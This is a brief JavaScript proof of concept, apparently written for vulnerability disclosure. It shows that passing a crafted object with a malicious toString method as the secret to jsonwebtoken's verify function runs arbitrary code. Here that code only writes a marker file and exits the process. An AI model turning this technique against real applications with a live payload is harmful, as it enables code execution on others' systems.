jwt = require('jsonwebtoken');
token = jwt.sign({ "x": "y" }, "some_secret");
var mal_obj = {
	toString: () => {
		console.log('PWNED!!!');
		process.on('exit', () => {
			require('fs').writeFileSync('malicious.txt', 'PWNED!!! Arbitary...');
		});
		process.exit(0)
	}
}
const res = jwt.verify(token, "some_secret");
console.log(res);
jwt.verify(token, mal_obj);
